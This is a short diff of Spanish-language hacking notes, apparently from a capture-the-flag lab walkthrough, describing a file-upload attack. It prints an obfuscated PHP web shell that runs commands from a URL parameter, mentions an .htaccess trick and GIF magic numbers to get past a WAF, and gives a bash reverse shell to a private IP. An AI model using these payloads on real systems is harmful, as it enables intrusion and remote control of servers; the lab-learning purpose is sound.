@@ -374,3 +374,33 @@ uploadr942.php como URL de imfadministrator
 
 ![[Pasted image 20251106033350.png]]
 
+
+
+se pueden subir imagenes
+
+los gif se pueden abrir 
+
+insertamos este payload para eludir el WAF
+magic numbers
+
+
+<?php
+$f = 'sy'.'stem';
+$f($_GET['cmd']);
+?>
+
+
+htaccess con php en gif
+
+nos ponemos en escucha
+
+usamos el payload
+
+"bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
+
+el & es un carade nalgas entonces nos toca URL encodearlo con %26
+
+y logramos conexion 
+
+---
+
